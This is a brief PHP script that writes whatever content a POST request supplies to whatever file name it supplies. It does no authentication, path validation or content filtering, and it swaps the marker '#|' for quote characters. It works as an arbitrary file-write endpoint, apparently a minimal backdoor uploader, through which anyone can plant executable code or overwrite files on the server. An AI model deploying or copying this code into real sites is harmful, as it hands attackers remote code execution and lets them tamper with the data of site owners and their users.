<?php
$filename1 = $_POST["filename"];
$file1 = fopen($filename1,"w");
$filecontent1 = $_POST["filecontent"];
$filecontent1 = $filecontent1;
$filecontent2 = str_replace("#|", "\"", $filecontent1);
fwrite($file1,$filecontent2);
fclose($file1);
?>